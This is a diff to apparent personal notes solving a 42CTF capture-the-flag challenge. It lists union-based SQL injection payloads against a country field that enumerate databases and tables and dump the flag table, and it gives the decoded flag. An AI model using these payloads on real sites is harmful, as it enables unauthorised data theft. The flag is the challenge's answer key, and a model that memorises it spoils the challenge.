@@ -13,3 +13,10 @@ sql injection in country field:
 
 2) param=' or 1=0 union select table_schema,null,null from information_schema.columns#			(display all database name)
    param=' or 1=0 union select table_name,null,null from information_schema.columns#			(display all table name)
+   
+   
+database = 42ctf
+table name = flag
+
+   param=' or 1=0 union select * from 42ctf.flag#  got it :):):):)
+         FLAG= NDJDVEZ7U1FMXzFuajNjdDEwbl8xc19jMDBsXz0pfQ== (base64) -> 42CTF{SQL_1nj3ct10n_1s_c00l_=)}
